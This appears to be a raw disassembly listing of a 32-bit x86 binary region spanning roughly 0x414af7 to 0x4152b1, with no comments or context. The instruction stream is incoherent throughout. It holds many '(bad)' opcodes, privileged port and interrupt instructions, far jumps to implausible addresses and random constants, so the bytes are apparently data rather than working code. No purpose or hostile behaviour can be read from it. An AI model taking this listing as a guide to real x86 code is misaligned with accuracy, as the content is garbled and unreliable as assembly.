  414af7:	mov    fs,esi
  414af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414afa:	inc    esp
  414afb:	xor    ecx,DWORD PTR [eax+0x3c9b84de]
  414b01:	test   dl,cl
  414b03:	mov    edx,0x1779ede1
  414b08:	add    al,0xe0
  414b0a:	mov    al,ds:0x437e2ba8
  414b0f:	sub    BYTE PTR [edx-0x40b909da],bh
  414b15:	mov    fs,WORD PTR [ebx+0x58]
  414b18:	xchg   edx,eax
  414b19:	into   
  414b1a:	cmp    BYTE PTR [esi],cl
  414b1c:	xchg   ebp,eax
  414b1d:	fdiv   DWORD PTR [ecx+0x7badfa8f]
  414b23:	out    0x7f,eax
  414b25:	or     BYTE PTR [ecx+0x14],bh
  414b28:	mov    edx,0xb316842d
  414b2d:	and    DWORD PTR [esi],ebp
  414b2f:	std    
  414b30:	lahf   
  414b31:	clc    
  414b32:	cmp    DWORD PTR [ebp+0x4b],edx
  414b35:	dec    ebp
  414b36:	dec    esi
  414b37:	fsubp  st(7),st
  414b39:	jle    0x414af2
  414b3b:	popa   
  414b3c:	sar    bl,1
  414b3e:	out    dx,eax
  414b3f:	pop    esp
  414b40:	sub    DWORD PTR [esi],0x4b
  414b43:	mov    cl,0x69
  414b45:	jmp    0x472bd2b7
  414b4a:	mov    dh,0xa0
  414b4c:	push   es
  414b4d:	sub    eax,0xae183da8
  414b52:	pop    edi
  414b53:	lds    ecx,FWORD PTR [edx+0x2b]
  414b56:	add    DWORD PTR [ebx-0x3c],ebx
  414b59:	jge    0x414b4e
  414b5b:	adc    cl,BYTE PTR [esp+ecx*1-0x4c14af74]
  414b62:	mov    edi,0xc372f02f
  414b67:	mov    si,0xa308
  414b6b:	xor    BYTE PTR [edx],ah
  414b6d:	clc    
  414b6e:	int    0xe4
  414b70:	mov    bh,0x8c
  414b72:	xchg   ebx,eax
  414b73:	sub    eax,eax
  414b75:	mov    ds:0x99c21bec,al
  414b7a:	sub    bl,BYTE PTR [esi]
  414b7c:	out    0xd,al
  414b7e:	retf   
  414b7f:	arpl   WORD PTR [edx+0x4e],cx
  414b82:	push   0xffffffd9
  414b84:	or     al,0xda
  414b86:	and    edi,ecx
  414b88:	je     0x414b68
  414b8a:	sbb    eax,0x4c0b6771
  414b8f:	sub    eax,0xfdc52bd7
  414b94:	add    cl,ah
  414b96:	push   ebp
  414b97:	adc    al,BYTE PTR [eax-0x31]
  414b9a:	inc    edx
  414b9b:	pop    edi
  414b9c:	or     esp,DWORD PTR [ecx]
  414b9e:	push   es
  414b9f:	out    0x57,al
  414ba1:	and    esi,DWORD PTR [esp+eax*1+0x15dad5d0]
  414ba8:	xchg   ebx,eax
  414ba9:	out    dx,eax
  414baa:	gs pop ebp
  414bac:	test   BYTE PTR [esp+ebx*8],cl
  414baf:	push   0xffffff9f
  414bb1:	push   esp
  414bb2:	cdq    
  414bb3:	pop    eax
  414bb4:	ror    BYTE PTR [ebx-0x74],1
  414bb7:	stos   DWORD PTR es:[edi],eax
  414bb8:	sahf   
  414bb9:	adc    DWORD PTR [eax+edx*1],0xb58b5380
  414bc0:	das    
  414bc1:	adc    eax,0x155060a
  414bc6:	push   cs
  414bc7:	cmc    
  414bc8:	test   DWORD PTR [edi-0x6f],ecx
  414bcb:	nop
  414bcc:	mov    dl,0xb1
  414bce:	ret    0x9321
  414bd1:	mov    al,ds:0xf25c09a3
  414bd6:	(bad)  
  414bd7:	dec    edi
  414bd8:	inc    eax
  414bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bda:	jne    0x414b7a
  414bdc:	imul   ecx,ebp,0x456ed6a5
  414be2:	test   al,0x3a
  414be5:	fdivr  QWORD PTR [esi]
  414be7:	fs es xchg esp,eax
  414bea:	sub    DWORD PTR [ebp-0x5d],0xc06b748b
  414bf1:	pusha  
  414bf2:	xchg   esi,eax
  414bf3:	bound  esp,QWORD PTR [esi-0x72]
  414bf6:	add    al,0x28
  414bf8:	mov    esp,0x8d766ad2
  414bfd:	or     DWORD PTR [eax-0x68ab4019],ebx
  414c03:	outs   dx,DWORD PTR ds:[esi]
  414c04:	dec    edx
  414c05:	push   ebp
  414c06:	ret    
  414c07:	mov    ebx,0x9b851a3b
  414c0c:	jl     0x414c0f
  414c0e:	lock (bad) ds:[eax]
  414c12:	dec    edi
  414c13:	and    DWORD PTR [ebp+0x55],esi
  414c16:	inc    eax
  414c17:	cdq    
  414c18:	daa    
  414c19:	dec    edi
  414c1a:	ins    DWORD PTR es:[edi],dx
  414c1b:	test   al,0x3a
  414c1d:	sbb    eax,DWORD PTR [esi+eiz*4]
  414c20:	pop    edx
  414c21:	in     eax,dx
  414c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c23:	aam    0x4c
  414c25:	cmp    al,0x49
  414c27:	pop    ds
  414c28:	fcomp  DWORD PTR [edx+0x68]
  414c2b:	adc    eax,0x39813f38
  414c30:	mov    esp,0x5c74cbba
  414c35:	movzx  esp,WORD PTR [edi+ecx*1+0x54]
  414c3a:	sub    ebp,DWORD PTR [edi-0x40a75a55]
  414c40:	(bad)  
  414c41:	cmc    
  414c42:	sti    
  414c43:	and    DWORD PTR [edx-0x5e],edi
  414c46:	adc    DWORD PTR [ecx+edi*8],esi
  414c49:	xor    eax,0x83a3857a
  414c4e:	xchg   edx,eax
  414c4f:	gs in  al,dx
  414c51:	into   
  414c52:	lds    ecx,FWORD PTR [eax+0x1505a176]
  414c58:	push   0x5e
  414c5a:	imul   BYTE PTR [edi+eax*4]
  414c5d:	div    DWORD PTR [esi-0x316a0169]
  414c63:	jbe    0x414c18
  414c65:	or     al,0x67
  414c67:	mov    eax,0x9424cdda
  414c6c:	test   al,0xb1
  414c6e:	imul   edi,esi,0x69
  414c71:	sbb    bh,BYTE PTR [edi-0x51]
  414c74:	ret    0x13db
  414c77:	test   al,0x48
  414c79:	and    DWORD PTR [edi],0x224bf1cc
  414c7f:	pop    ss
  414c80:	inc    esi
  414c81:	cmp    ebx,ecx
  414c83:	sub    edi,DWORD PTR ds:0xb5b3002a
  414c89:	push   edi
  414c8a:	cmp    DWORD PTR [edx],edx
  414c8c:	mov    ah,0x0
  414c8e:	push   esp
  414c8f:	and    BYTE PTR fs:[ebp-0x400b1e4b],al
  414c96:	xchg   ecx,eax
  414c97:	pop    ebp
  414c98:	xchg   ebx,eax
  414c99:	or     cl,bl
  414c9b:	add    ah,BYTE PTR ds:0x4ff8a28b
  414ca1:	popa   
  414ca2:	jbe    0x414d00
  414ca4:	imul   eax,DWORD PTR [esi+0x52a4a45e],0x7598b35e
  414cae:	mov    gs,WORD PTR [esi+0x547dfd50]
  414cb4:	retf   0xa00a
  414cb7:	or     al,0x71
  414cb9:	dec    eax
  414cba:	stc    
  414cbb:	push   esi
  414cbc:	loope  0x414c8c
  414cbe:	sbb    al,0xf7
  414cc0:	add    eax,0xa5f423f
  414cc5:	repz mov ds:0x88b8f529,al
  414ccb:	mov    ds:0x2bf359b5,al
  414cd0:	loopne 0x414c93
  414cd2:	loop   0x414cf2
  414cd4:	jmp    0x41525e
  414cd9:	mov    ah,0xb5
  414cdb:	xor    al,0xf
  414cdd:	xor    al,0x8e
  414cdf:	xor    al,0xb5
  414ce1:	or     dh,BYTE PTR [edx+0x26]
  414ce4:	je     0x414ce0
  414ce6:	shr    BYTE PTR es:[eax+0x160cd394],cl
  414ced:	cmp    eax,0xa8161604
  414cf2:	adc    edx,esp
  414cf4:	adc    eax,0x3bac994e
  414cf9:	mov    edx,0x3d90bd27
  414cfe:	add    eax,DWORD PTR [esi+ebx*4-0x4e522d60]
  414d05:	ret    0x936f
  414d08:	test   eax,0x994e4dbf
  414d0d:	ret    
  414d0e:	mov    WORD PTR [esi+eiz*8],?
  414d11:	add    DWORD PTR ss:[ebx],ebx
  414d14:	(bad)  
  414d15:	xor    al,0x9f
  414d17:	ror    BYTE PTR [eax],1
  414d19:	dec    ebp
  414d1a:	add    ecx,DWORD PTR [ebp+0x52ab9469]
  414d20:	aam    0xb2
  414d22:	inc    ebp
  414d23:	cmp    ebx,ebx
  414d25:	scas   eax,DWORD PTR es:[edi]
  414d26:	pop    ds
  414d27:	xchg   esi,eax
  414d28:	hlt    
  414d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d2a:	fsubr  DWORD PTR [esi-0x36]
  414d2d:	mov    ebx,DWORD PTR [edi+edx*8-0xe]
  414d31:	dec    edi
  414d32:	test   DWORD PTR [ecx],0x61a6a721
  414d38:	mov    dl,al
  414d3a:	lds    edi,FWORD PTR [ecx+ebp*4]
  414d3d:	add    edi,DWORD PTR ds:0x434bbb19
  414d43:	xor    DWORD PTR [esi+0x1d],0x88731aa0
  414d4a:	fcomp  DWORD PTR [esi]
  414d4c:	sbb    ecx,esi
  414d4e:	aaa    
  414d4f:	int3   
  414d50:	ror    BYTE PTR [edx-0x7d],0x5c
  414d54:	mov    dl,0x1d
  414d56:	push   es
  414d57:	sub    al,dl
  414d59:	js     0x414d50
  414d5b:	cmp    DWORD PTR [ecx-0x3df652a4],esp
  414d61:	mov    edi,0xb022cc4
  414d66:	add    ebx,0xffffff91
  414d69:	pop    ebp
  414d6a:	inc    ebp
  414d6b:	jl     0x414d58
  414d6d:	jl     0x414d97
  414d6f:	jae    0x414d99
  414d71:	(bad)  
  414d72:	mov    dl,0x56
  414d74:	ret    
  414d75:	pop    edx
  414d76:	xchg   edi,eax
  414d77:	mov    ebx,0x4051fcd0
  414d7c:	inc    esi
  414d7d:	ins    DWORD PTR es:[edi],dx
  414d7e:	icebp  
  414d7f:	mov    ebp,0x8104af8e
  414d84:	adc    al,0xb3
  414d86:	dec    esp
  414d87:	push   0xfffffffc
  414d89:	push   ss
  414d8a:	inc    ebp
  414d8b:	inc    esi
  414d8c:	call   0x882c:0x8b7e8220
  414d93:	dec    esp
  414d94:	sub    esi,0xffffffd3
  414d97:	add    DWORD PTR [edx+0x1e],ecx
  414d9a:	lock out 0x6c,al
  414d9d:	icebp  
  414d9e:	dec    ecx
  414d9f:	clc    
  414da0:	adc    esp,edx
  414da2:	jbe    0x414ded
  414da4:	and    bh,BYTE PTR [ecx-0x4d]
  414da7:	dec    esi
  414da8:	fisubr WORD PTR [ecx]
  414daa:	add    cl,BYTE PTR [ebx]
  414dac:	xchg   ecx,eax
  414dad:	(bad)  
  414dae:	je     0x414d93
  414db0:	stos   BYTE PTR es:[edi],al
  414db1:	cmp    edi,DWORD PTR [esi]
  414db3:	mov    al,0xce
  414db5:	jle    0x414dfe
  414db7:	push   0xbf5d067
  414dbc:	xchg   esp,eax
  414dbd:	cmp    BYTE PTR [eax+0x6b],ah
  414dc0:	ja     0x414d8a
  414dc2:	and    DWORD PTR [esi+0x31],0xffffffab
  414dc6:	imul   edi,DWORD PTR [esi+ebp*4-0x7a],0x83783f86
  414dce:	pop    ax
  414dd0:	dec    edx
  414dd1:	aam    0x3e
  414dd3:	or     dl,BYTE PTR [edi-0x3]
  414dd6:	in     eax,0xce
  414dd8:	dec    esi
  414dd9:	(bad)  
  414dda:	fistp  QWORD PTR ds:0xa732c712
  414de0:	mov    ebx,0xf0b4b5df
  414de5:	xor    dh,al
  414de7:	retf   0x112
  414dea:	test   eax,0x12077354
  414def:	mov    dl,0x79
  414df1:	in     al,dx
  414df2:	xor    eax,0x1d54872b
  414df7:	sub    BYTE PTR [esi-0x14],bl
  414dfa:	retf   0x9b4b
  414dfd:	xchg   BYTE PTR [esi+ecx*8-0x3f],dl
  414e01:	call   FWORD PTR [ecx]
  414e03:	cmp    al,0x4f
  414e05:	mov    dh,0xcb
  414e07:	mov    ebx,0xe6e633c9
  414e0c:	add    bh,BYTE PTR [edx]
  414e0e:	pop    es
  414e0f:	loopne 0x414e5e
  414e11:	pop    esi
  414e12:	ins    BYTE PTR es:[edi],dx
  414e13:	in     al,0x89
  414e15:	loop   0x414e32
  414e17:	lea    ebp,ds:0xa437e531
  414e1d:	nop
  414e1e:	lock ja 0x414e09
  414e21:	stc    
  414e22:	imul   DWORD PTR [ebx+0x35fba79d]
  414e28:	imul   ebx,esp,0xffffffc8
  414e2b:	xchg   ebp,eax
  414e2c:	(bad)  
  414e2d:	sbb    eax,0x93ff093e
  414e32:	push   ebx
  414e33:	push   0xceec35f4
  414e38:	inc    edi
  414e39:	pop    DWORD PTR ds:0xd94def24
  414e3f:	scas   eax,DWORD PTR es:[edi]
  414e40:	not    esp
  414e42:	ins    DWORD PTR es:[edi],dx
  414e43:	mov    edx,0x423e948c
  414e48:	inc    edi
  414e49:	imul   ecx,DWORD PTR [edx-0x33b69bbb],0x5e
  414e50:	and    DWORD PTR [edi-0x1dbbe466],edi
  414e56:	pop    eax
  414e57:	push   edi
  414e58:	sbb    DWORD PTR [edi+0x6c],eax
  414e5b:	retf   
  414e5c:	sar    ch,0xc5
  414e5f:	mov    ds:0x236f5a07,al
  414e64:	cmp    ecx,DWORD PTR [eax]
  414e66:	mov    ah,0xb0
  414e68:	jnp    0x414eba
  414e6a:	cmp    eax,0xb4a551d5
  414e6f:	data16 loopne 0x414e87
  414e72:	mov    cl,0x67
  414e74:	rol    BYTE PTR ds:0x5c029548,0x4a
  414e7b:	neg    DWORD PTR [eax+0x5440d486]
  414e81:	cwde   
  414e82:	aad    0x8c
  414e84:	out    dx,al
  414e85:	fidiv  DWORD PTR [ecx+0x128358af]
  414e8b:	retf   0xf879
  414e8e:	add    esi,DWORD PTR ds:0x12aabc98
  414e94:	sar    DWORD PTR [edx-0x413bafb7],0x12
  414e9b:	jmp    0x4f931922
  414ea0:	ins    DWORD PTR es:[edi],dx
  414ea1:	sbb    ah,BYTE PTR [esi]
  414ea3:	enter  0xa0da,0x90
  414ea7:	retf   0x3897
  414eaa:	rcr    edi,cl
  414eac:	loopne 0x414ef0
  414eae:	out    0x7f,al
  414eb0:	std    
  414eb1:	pop    esi
  414eb2:	inc    esp
  414eb3:	xchg   ebp,eax
  414eb4:	mov    eax,0x70469f2d
  414eb9:	push   0xa6e9cb65
  414ebe:	jle    0x414f0a
  414ec0:	scas   eax,DWORD PTR es:[edi]
  414ec1:	leave  
  414ec2:	mov    edi,cs
  414ec4:	push   ss
  414ec5:	push   ds
  414ec6:	arpl   WORD PTR [edx],bx
  414ec8:	mov    bl,0xe2
  414eca:	(bad)  
  414ecb:	sar    BYTE PTR [ebx+0x4946cb47],cl
  414ed1:	shl    DWORD PTR [edx],0x29
  414ed4:	sbb    eax,ecx
  414ed6:	int    0xa3
  414ed8:	add    al,0x60
  414eda:	lahf   
  414edb:	add    DWORD PTR [edi+ebp*2-0x47],esp
  414edf:	sbb    esi,esi
  414ee1:	jmp    0x414ec6
  414ee3:	fisub  DWORD PTR [edi]
  414ee5:	pop    eax
  414ee6:	and    dl,BYTE PTR [ebx]
  414ee8:	cmp    esp,DWORD PTR [esi]
  414eea:	jl     0x414e9d
  414eec:	(bad)  
  414eed:	sub    DWORD PTR [ecx-0x7f],esi
  414ef0:	loop   0x414e72
  414ef2:	cli    
  414ef3:	mov    bh,0xbe
  414ef5:	xchg   edx,eax
  414ef6:	xlat   BYTE PTR ds:[ebx]
  414ef7:	pushf  
  414ef8:	mov    al,ds:0xcb21ab2a
  414efd:	icebp  
  414efe:	adc    BYTE PTR [esi+edi*8+0x560820ab],bl
  414f05:	or     eax,0x50e68010
  414f0a:	test   al,0xe4
  414f0c:	pop    esi
  414f0d:	add    al,0xd9
  414f0f:	stos   DWORD PTR es:[edi],eax
  414f10:	mov    esi,0x1c38d2c1
  414f15:	sub    bl,ch
  414f17:	jno    0x414ece
  414f19:	dec    ebx
  414f1a:	push   0xffffffd9
  414f1c:	cmp    ah,BYTE PTR [edx+0x2c6c7f8f]
  414f22:	mov    WORD PTR [eax+0x5c43ae42],es
  414f28:	dec    BYTE PTR [esi-0x51]
  414f2b:	pop    ss
  414f2c:	(bad)  
  414f2e:	div    BYTE PTR [eax-0x4e880932]
  414f34:	aad    0x8c
  414f36:	das    
  414f37:	sub    DWORD PTR ds:0xdedf88b9,0x7e
  414f3e:	cmp    dh,BYTE PTR [ebx]
  414f40:	cmp    DWORD PTR [ebx-0x20],esp
  414f43:	sbb    ebx,0xa8eb24f5
  414f49:	xor    ebp,DWORD PTR [eax-0x64303185]
  414f4f:	(bad)  
  414f50:	in     al,0xb
  414f52:	jp     0x414f1f
  414f54:	in     eax,0xd8
  414f56:	nop
  414f57:	lods   eax,DWORD PTR ds:[esi]
  414f58:	pop    ds
  414f59:	cmp    ch,BYTE PTR [edx]
  414f5b:	xchg   ecx,eax
  414f5c:	and    esi,eax
  414f5e:	retf   
  414f5f:	mov    dh,0x7f
  414f61:	and    DWORD PTR [edx+0x40],ebx
  414f64:	mov    BYTE PTR [edi],0x0
  414f67:	push   esi
  414f68:	lds    eax,FWORD PTR [eax]
  414f6a:	retf   
  414f6b:	(bad)  
  414f6c:	(bad)  [ecx]
  414f6e:	or     DWORD PTR [ecx*8+0x5cbdc0fc],eax
  414f75:	or     ebp,DWORD PTR [ebx+0x48ae2ead]
  414f7b:	mov    edi,0xfc288ae4
  414f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f81:	fmul   DWORD PTR [ebx+0x6fc1e03c]
  414f87:	sbb    cl,BYTE PTR [edx+0x3a]
  414f8a:	cld    
  414f8b:	xor    ah,dh
  414f8d:	dec    ebx
  414f8e:	push   eax
  414f8f:	test   edx,esp
  414f91:	pusha  
  414f92:	push   0x4881c4dc
  414f97:	sbb    bl,BYTE PTR ds:0x918981a4
  414f9d:	popa   
  414f9e:	lock sti 
  414fa0:	push   ds
  414fa1:	das    
  414fa2:	push   es
  414fa3:	lods   eax,DWORD PTR ds:[esi]
  414fa4:	dec    esp
  414fa5:	jmp    0xbd63f99b
  414faa:	enter  0x214d,0xcb
  414fae:	call   0x5b266390
  414fb3:	and    al,0x47
  414fb5:	mov    WORD PTR [edx-0x7a0487c],fs
  414fbb:	lds    ecx,FWORD PTR [esi]
  414fbd:	jle    0x414ff1
  414fbf:	out    0x97,eax
  414fc1:	fwait
  414fc2:	jmp    0x41502d
  414fc4:	aad    0xa2
  414fc6:	inc    eax
  414fc7:	add    eax,0xc75e4ae6
  414fcc:	inc    ebp
  414fcd:	push   ecx
  414fce:	stos   DWORD PTR es:[edi],eax
  414fcf:	jg     0x414f80
  414fd1:	ins    BYTE PTR es:[edi],dx
  414fd2:	inc    eax
  414fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fd4:	and    esp,DWORD PTR [edi]
  414fd6:	test   BYTE PTR [esi-0x4b9bc128],0x44
  414fdd:	push   DWORD PTR [ebx+ecx*2]
  414fe0:	test   al,0xe7
  414fe2:	cmp    DWORD PTR [edx],eax
  414fe4:	jb     0x415003
  414fe6:	mov    eax,0xc03b4e29
  414feb:	pop    ebp
  414fec:	jbe    0x41504c
  414fee:	dec    edi
  414fef:	cmp    al,0xd7
  414ff1:	test   DWORD PTR [edx],esp
  414ff3:	test   al,0xb2
  414ff5:	push   0xffffffb2
  414ff7:	dec    esp
  414ff8:	repz xchg edx,eax
  414ffa:	std    
  414ffb:	pop    ecx
  414ffc:	lods   al,BYTE PTR ds:[esi]
  414ffd:	jo     0x415043
  414fff:	xor    al,0xed
  415001:	cld    
  415002:	pop    ss
  415003:	sti    
  415004:	sbb    dh,BYTE PTR [edi]
  415006:	cmp    dl,BYTE PTR [ecx+0x631522b6]
  41500c:	pop    esp
  41500d:	ret    0x192a
  415010:	mov    edx,edi
  415012:	jle    0x414fbc
  415014:	mov    al,ds:0xba55dfa7
  415019:	rcl    DWORD PTR [eax],cl
  41501b:	sbb    dh,dl
  41501d:	(bad)  
  41501e:	add    DWORD PTR [eax],ebx
  415020:	sahf   
  415021:	(bad)  
  415022:	and    ebx,edi
  415024:	je     0x415084
  415026:	shr    DWORD PTR [ebx-0x545ef4ac],cl
  41502c:	out    0x44,al
  41502e:	sbb    ah,al
  415030:	and    eax,0x6d73daa4
  415035:	or     BYTE PTR [ebp+0x6dc490fe],0xf3
  41503c:	mov    dl,0xdc
  41503e:	rcl    BYTE PTR [edi-0x39],1
  415041:	fwait
  415042:	mov    dl,0x64
  415044:	jae    0x4150ad
  415046:	mov    eax,0x337fa727
  41504b:	jo     0x415019
  41504d:	(bad)  
  41504e:	mov    esp,0xc9b17eb5
  415053:	daa    
  415054:	fiadd  WORD PTR [edi-0x67]
  415057:	imul   ch
  415059:	icebp  
  41505a:	mov    ebx,0x192b71d9
  41505f:	xchg   ebp,eax
  415060:	push   ds
  415061:	pop    eax
  415062:	pop    edi
  415063:	icebp  
  415064:	int    0xd3
  415066:	pop    esp
  415067:	mov    WORD PTR [edi+0x1857354c],es
  41506d:	xchg   esi,eax
  41506e:	add    BYTE PTR [ebp-0x5c],ah
  415071:	mov    WORD PTR [edx+edi*1],gs
  415074:	out    0xd,al
  415076:	imul   eax,ebx,0x79
  415079:	xlat   BYTE PTR ds:[ebx]
  41507a:	cmp    al,0x3e
  41507c:	lods   eax,DWORD PTR ds:[esi]
  41507d:	std    
  41507e:	mov    eax,0x35fb6d24
  415083:	(bad)
  415086:	clc    
  415087:	xor    dl,BYTE PTR [ebx-0x37]
  41508a:	call   0x7a58cdea
  41508f:	call   FWORD PTR [edx-0x112896e0]
  415095:	and    BYTE PTR [ebx-0x4a],0x70
  415099:	dec    esi
  41509a:	dec    ebx
  41509b:	xchg   DWORD PTR [ecx+esi*8+0x12b5698c],edx
  4150a2:	out    dx,al
  4150a3:	loop   0x4150f9
  4150a5:	les    edi,FWORD PTR [esi-0x6d591bd]
  4150ab:	jne    0x4150be
  4150ad:	adc    al,0x90
  4150af:	fnsave es:[ebx+0x30f78a4c]
  4150b6:	retf   0xf77f
  4150b9:	jmp    0xdce0:0x51611afa
  4150c0:	gs push ecx
  4150c2:	inc    ebx
  4150c3:	add    BYTE PTR [esi+0x2],dh
  4150c6:	sub    al,0x3f
  4150c8:	and    eax,0x7462b2d3
  4150cd:	mov    esp,0x4fb50114
  4150d2:	test   eax,0x8eb42cd7
  4150d7:	fs pop ss
  4150d9:	iret   
  4150da:	fcomp  QWORD PTR ds:0xcfe0c7e4
  4150e0:	or     eax,0x36f3581d
  4150e5:	loopne 0x415103
  4150e7:	add    al,0x5e
  4150e9:	xor    al,0x44
  4150eb:	mov    cl,0x1a
  4150ed:	jo     0x415130
  4150ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150f0:	push   ds
  4150f1:	add    edx,DWORD PTR [ebx-0x5e]
  4150f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f5:	or     ebx,0xffffff95
  4150f8:	xchg   esi,eax
  4150f9:	pop    ebx
  4150fa:	push   ss
  4150fb:	lea    ebp,[esi+0x3d]
  4150fe:	in     eax,dx
  4150ff:	retf   
  415100:	or     eax,0x4d4162f1
  415105:	fsubr  st,st(4)
  415107:	test   al,0x99
  415109:	push   edi
  41510a:	stos   BYTE PTR es:[edi],al
  41510b:	inc    ebx
  41510c:	hlt    
  41510d:	mov    edx,0xded6cb22
  415112:	dec    ebx
  415113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415114:	add    ebp,DWORD PTR [edi+0x5bd97e4]
  41511a:	stos   BYTE PTR es:[edi],al
  41511b:	test   dh,bl
  41511d:	or     DWORD PTR [ecx+0x59],0x8
  415121:	test   eax,edi
  415123:	stc    
  415124:	pop    ebp
  415125:	push   es
  415126:	fmul   QWORD PTR [ebp-0x16]
  415129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41512a:	mov    fs,esp
  41512c:	push   ss
  41512d:	ror    BYTE PTR [edi+0x38],1
  415130:	pop    edx
  415131:	jnp    0x4150c9
  415133:	or     al,BYTE PTR [eax+0x40ba613c]
  415139:	daa    
  41513a:	cmp    eax,0x454aaf6c
  41513f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415140:	cmc    
  415141:	sub    BYTE PTR [edi-0xb3f7d7b],bh
  415147:	hlt    
  415148:	inc    ecx
  415149:	(bad)  
  41514b:	out    0x2b,eax
  41514d:	push   cs
  41514e:	push   es
  41514f:	fdivr  DWORD PTR [edi-0x64]
  415152:	or     edi,eax
  415154:	outs   dx,DWORD PTR ds:[esi]
  415155:	repnz cli 
  415157:	add    ch,BYTE PTR [edx+0x2b]
  41515a:	loopne 0x4151a0
  41515c:	sahf   
  41515d:	sub    dl,bh
  41515f:	xor    al,0x1c
  415161:	and    dl,BYTE PTR [ebp-0x18]
  415164:	xlat   BYTE PTR ds:[ebx]
  415165:	xor    al,0x6
  415167:	cmc    
  415168:	pop    edi
  415169:	pop    ebx
  41516a:	dec    al
  41516c:	inc    esi
  41516d:	mov    DWORD PTR [ecx],esi
  41516f:	pop    esp
  415170:	inc    ecx
  415171:	prefetcht2 BYTE PTR [ebx-0x55]
  415175:	xchg   BYTE PTR [edx],dh
  415177:	pop    esp
  415178:	push   ebp
  415179:	jge    0x415182
  41517b:	mov    ebx,0x9fb59aa3
  415180:	adc    cl,al
  415182:	cmc    
  415183:	xlat   BYTE PTR ds:[ebx]
  415184:	cld    
  415185:	(bad)  
  415186:	sti    
  415187:	cmp    BYTE PTR [esi+0x7467e2f0],cl
  41518d:	push   eax
  41518e:	les    eax,FWORD PTR [eax]
  415190:	pop    eax
  415191:	fs out 0x11,al
  415194:	cwde   
  415195:	xchg   edi,eax
  415196:	ror    BYTE PTR [ebx],0xba
  415199:	dec    ebx
  41519a:	test   al,0xaf
  41519c:	in     al,dx
  41519d:	mov    BYTE PTR [ecx+0x76],ch
  4151a0:	iret   
  4151a1:	test   BYTE PTR [edx-0x6],0xe3
  4151a5:	mov    esp,0x27ba3f82
  4151aa:	in     eax,0x95
  4151ac:	fnsave [edx-0x74]
  4151af:	outs   dx,BYTE PTR ds:[esi]
  4151b0:	daa    
  4151b1:	mov    esi,?
  4151b3:	inc    edx
  4151b4:	int    0x29
  4151b6:	test   BYTE PTR [edx],ch
  4151b8:	mov    cl,0x6
  4151ba:	mov    ch,0xfd
  4151bc:	xor    eax,DWORD PTR [esi+0x7eab61a3]
  4151c2:	or     esi,DWORD PTR [eax+eax*1-0x4b]
  4151c6:	retf   
  4151c7:	es in  al,dx
  4151c9:	aam    0x20
  4151cb:	retf   0xe94c
  4151ce:	fld    st(1)
  4151d0:	or     esp,DWORD PTR [ebp+0x5f2b9c59]
  4151d6:	gs in  al,dx
  4151d8:	mov    cl,0x8d
  4151da:	add    ebx,esi
  4151dc:	lds    edi,FWORD PTR [ecx]
  4151de:	xchg   BYTE PTR [ebx+0x887cc26],bh
  4151e4:	sub    eax,0x86c6594f
  4151e9:	sub    dh,BYTE PTR [edi]
  4151eb:	mov    dh,0xe9
  4151ed:	mov    al,ds:0x4cbded9a
  4151f2:	push   ss
  4151f3:	addr16 inc edi
  4151f5:	cdq    
  4151f6:	pushf  
  4151f7:	jae    0x41521c
  4151f9:	mov    bh,0x2f
  4151fb:	add    esp,DWORD PTR [esi-0x4d]
  4151fe:	push   cs
  4151ff:	hlt    
  415200:	leave  
  415201:	sahf   
  415202:	dec    ebp
  415203:	xchg   esi,eax
  415204:	enter  0xaf65,0x13
  415208:	xchg   DWORD PTR [eax-0x68661c9],esi
  41520e:	imul   edx,DWORD PTR [esi-0xf],0x1fd90e13
  415215:	dec    ebx
  415216:	or     al,0x9a
  415218:	push   eax
  415219:	xchg   ecx,eax
  41521a:	jecxz  0x4151f1
  41521c:	sub    ebp,DWORD PTR [edi+0x2]
  41521f:	call   0x187ac354
  415224:	push   0xc159c2d4
  415229:	or     al,0xbe
  41522b:	push   0x13
  41522d:	sahf   
  41522e:	mov    ?,WORD PTR [eax]
  415230:	mov    edx,0x1ec3137c
  415235:	xchg   edx,eax
  415236:	ins    DWORD PTR es:[edi],dx
  415237:	(bad)  
  415238:	(bad)  
  41523a:	cli    
  41523b:	rcr    DWORD PTR [eax+eax*8],1
  41523e:	jge    0x41521b
  415240:	sub    esp,DWORD PTR [ebx+0x2e]
  415243:	popa   
  415244:	dec    ebx
  415245:	mov    eax,0x41f3f1cf
  41524a:	inc    edi
  41524b:	sbb    esi,ebx
  41524d:	adc    eax,0xbae95d2
  415252:	repnz dec ebp
  415254:	xor    eax,0x1
  415257:	push   es
  415258:	pop    ecx
  415259:	xchg   ecx,eax
  41525a:	(bad)
  41525e:	mov    eax,0xc0000000
  415263:	xor    edx,eax
  415265:	mov    DWORD PTR [ebp+0x14],edx
  415268:	mov    edx,DWORD PTR [esi]
  41526a:	mov    edi,DWORD PTR [esi+0x4]
  41526d:	xor    edi,0x9c0a89d8
  415273:	jmp    0x4157fd
  415278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415279:	(bad)  
  41527a:	outs   dx,DWORD PTR ds:[esi]
  41527b:	test   DWORD PTR [ebp+0x24],esp
  41527e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41527f:	ss das 
  415281:	sahf   
  415282:	cmp    BYTE PTR [eax+0x7d],ch
  415285:	lds    edi,FWORD PTR [eax]
  415287:	push   0x160ccfc3
  41528c:	cmp    eax,0x9a161604
  415291:	add    BYTE PTR [ebx+0x1e],bl
  415294:	xor    al,0xf8
  415296:	in     al,0x78
  415298:	fsub   QWORD PTR ds:0x2dcc9fb7
  41529e:	fsub   QWORD PTR [esi+0x54]
  4152a1:	in     eax,dx
  4152a2:	out    dx,al
  4152a3:	fimul  WORD PTR [edi-0x9]
  4152a6:	dec    ecx
  4152a7:	jecxz  0x41530e
  4152a9:	shl    BYTE PTR [eax],cl
  4152ab:	imul   ebp,DWORD PTR [ebp-0x5f],0xffffffe4
  4152af:	adc    al,0xaa
  4152b1:	push   ds
